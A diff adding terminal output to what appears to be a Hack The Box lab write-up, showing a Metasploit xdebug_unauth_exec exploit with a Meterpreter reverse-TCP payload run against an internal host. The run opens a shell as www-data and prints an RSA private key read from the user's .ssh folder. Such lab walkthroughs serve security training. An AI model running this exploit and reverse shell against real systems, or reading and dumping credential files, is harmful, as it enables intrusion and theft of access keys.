@@ -176,3 +176,179 @@ drwxr-xr-x 3 root root 4096 Dec  6 20:39 fixgz
 2021-12-06 20:48:46 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
 -------------------------------snip-------------------------------------
 ```
+
+
+```
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# ifconfig
+eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 7c:10:c9:25:5a:d8  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 5496  bytes 274800 (268.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5496  bytes 274800 (268.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.14.48  netmask 255.255.254.0  destination 10.10.14.48
+        inet6 fe80::40e8:cb81:40ef:7fe  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef:2::102e  prefixlen 64  scopeid 0x0<global>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 59291  bytes 27784621 (26.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 63088  bytes 9157432 (8.7 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
+        inet6 fe80::83e2:6aa0:82e7:882d  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5  bytes 240 (240.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+                                                                                                                                                                                                                                       
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# ip route add 172.20.0.0/24 dev tun9
+                                                                                                                                                                                                                                           
+┌──(root💀sac)-[~/Downloads/hackthebox/www]
+└─# msfconsole     
+                                                  
+
+  Metasploit Park, System Security Interface
+  Version 4.0.5, Alpha E                                                                                                                                                                                                                   
+  Ready...                                                                                                                                                                                                                                 
+  > access security                                                                                                                                                                                                                        
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View all productivity tips with the 
+tips command
+
+msf6 > use exploit/unix/http/xdebug_unauth_exec
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(unix/http/xdebug_unauth_exec) > set PATH /vpn/login.php
+PATH => /vpn/login.php
+msf6 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 172.20.0.10
+RHOSTS => 172.20.0.10
+msf6 exploit(unix/http/xdebug_unauth_exec) > set LHOST tun9
+LHOST => tun9
+msf6 exploit(unix/http/xdebug_unauth_exec) > set LPORT 9001
+LPORT => 9001
+msf6 exploit(unix/http/xdebug_unauth_exec) > options
+
+Module options (exploit/unix/http/xdebug_unauth_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /vpn/login.php   yes       Path to target webapp
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   172.20.0.10      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT    80               yes       The target port (TCP)
+   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
+   SRVPORT  9000             yes       Port to listen for the debugger
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun9             yes       The listen address (an interface may be specified)
+   LPORT  9001             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/http/xdebug_unauth_exec) > run
+
+[*] Started reverse TCP handler on 172.30.0.9:9001 
+[*] 172.20.0.10:80 - Waiting for client response.
+[*] 172.20.0.10:80 - Receiving response
+[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.
+[*] 172.20.0.10:80 - Sending payload of size 2026 bytes
+[*] Sending stage (39282 bytes) to 172.30.0.1
+[*] Meterpreter session 1 opened (172.30.0.9:9001 -> 172.30.0.1:52934 ) at 2021-12-06 20:57:20 +0530
+id
+
+meterpreter > id
+[-] Unknown command: id
+meterpreter > shell
+Process 67 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ls
+actions.php
+database.php
+header.php
+index.php
+login.php
+panel.php
+src
+pwd
+/var/www/html/vpn
+cd /home/www-data/.ssh
+ls
+authorized_keys
+id_rsa
+id_rsa.pub
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
+nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
+QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
+VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
+mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
+17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
+cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
+pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
+ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
+GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
+j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
+Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
+qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
+gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
++1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
+te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
+CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
+Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
+PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
+aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
+yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
+/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
+zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
+sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
+s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
+-----END RSA PRIVATE KEY-----
+```
